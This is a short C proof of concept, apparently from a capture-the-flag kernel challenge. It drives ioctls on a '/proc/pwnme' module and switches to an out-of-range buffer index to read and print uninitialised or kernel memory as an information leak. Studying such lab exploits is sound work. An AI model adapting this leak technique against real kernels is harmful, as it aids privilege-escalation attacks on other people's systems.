#include <stdlib.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>

#define PROC "/proc/pwnme"
#define IOCTL_CREATE _IOW('p', 0, struct args_create)
#define IOCTL_SWITCH _IOW('p', 1, struct args_switch)

struct args_create { size_t size; };
struct args_switch { long index;  };

int fd, ret;

void ioctl_create(size_t size) {
    struct args_create arg = {
        .size = size
    };

    ret = ioctl(fd, IOCTL_CREATE, &arg);
    if (ret == -1) {
        printf("Error on ioctl create : %d\n", errno);
        exit(EXIT_FAILURE);
    } 
}

void ioctl_switch(long index) {
    struct args_switch arg = {
        .index = index
    };

    ret = ioctl(fd, IOCTL_SWITCH, &arg);
    if (ret == -1) {
        printf("Error on ioctl switch : %d\n", errno);
        exit(EXIT_FAILURE);
    }
}

int main() {
    char buf[0x40] = {};

    setvbuf(stdout,0,_IONBF,0);
    setvbuf(stdin,0,_IONBF,0);
    fd = open(PROC, O_RDWR);

    ioctl_create(0x40);
    ioctl_switch(1);

    read(fd, buf, 0x40);

    for (int i = 0; i < 8; i++) {
        printf("%lx\n", ((uint64_t *)buf)[i]);
    }

    return 0;

}
